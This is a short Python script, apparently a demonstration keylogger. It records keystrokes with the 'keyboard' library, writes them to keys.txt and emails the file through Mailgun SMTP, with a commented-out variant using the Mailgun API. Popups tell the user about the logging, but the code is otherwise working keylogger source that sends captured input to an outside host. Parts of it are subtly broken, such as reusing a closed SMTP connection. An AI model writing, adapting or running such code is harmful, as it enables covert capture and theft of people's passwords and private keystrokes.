import tkinter as tk
from tkinter import ttk
import pandas as pd
import keyboard as key
import requests # - API
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

NORM_FONT = ("Comic Sans", 12)

#Send Email via SMTP
keywords = MIMEMultipart("mixed")
keywords['Subject'] = "绝密"
keywords["From"] = "foo@YOUR_DOMAIN_NAME" # If you're using Mailgun
keywords["To"] = "AN_EMAIL"
actual_text = "This is your periodic keyboard event delivery, 同志"
body = MIMEText(actual_text)
keywords.attach(body)
s = smtplib.SMTP('smtp.mailgun.org', 587)
attachmentPath = "keys.txt"
#Send an attachment with the Email - SMTP
try:
    with open(attachmentPath, "rb") as attachment:
        p = MIMEApplication(attachment.read(), _subtype="txt")
        p.add_header('Content-Disposition', "attachment; filename=%s" %
                     attachmentPath.split("\\")[-1])
        keywords.attach(p)
except Exception as e:
    print(str(e))


def popup_message(msg):
    popup = tk.Tk()
    popup.wm_title("Achtung!")
    popup.attributes('-alpha', 0.8)
    label = ttk.Label(popup, text=msg, font=NORM_FONT)
    label.pack(side="top", fill="x", pady=10)
    b1 = ttk.Button(popup, text="Fine...", command=popup.destroy)
    b1.pack()
    popup.mainloop()


#Send Email via Mailgun API
# def send_simple_message():
#     return requests.post("https://api.mailgun.net/v3/YOUR_DOMAIN_NAME/messages",
#                          auth=("api", "YOUR_API_KEY"),
#                          files=[("attachment", open("keys.txt"))],
#                          data={"from": "Excited User <mailgun@YOUR_DOMAIN_NAME>",
#                                "to": ['AN_EMAIL', 'ANOTHER_EMAIL],
#                                "subject": "绝密",
#                                "text": "This is your periodic keyboard event delivery, 同志"})


while True:
    popup_message("I'm logging your keyboard events. I hope that's ok!")
    key_storage = key.record(until="enter")
    key_frame = pd.DataFrame(key_storage)
    key_frame.to_csv('keys.txt', index=False)

    # send_simple_message() - API
    popup_message("I'm now sending your keyboard events to someone!")
    s.login('postmaster@YOUR_DOMAIN_NAME', 'YOUR_PASSWORD') # Again, if Mailgun
    s.sendmail(keywords["From"], keywords["To"], keywords.as_string())
    s.quit()
    continue
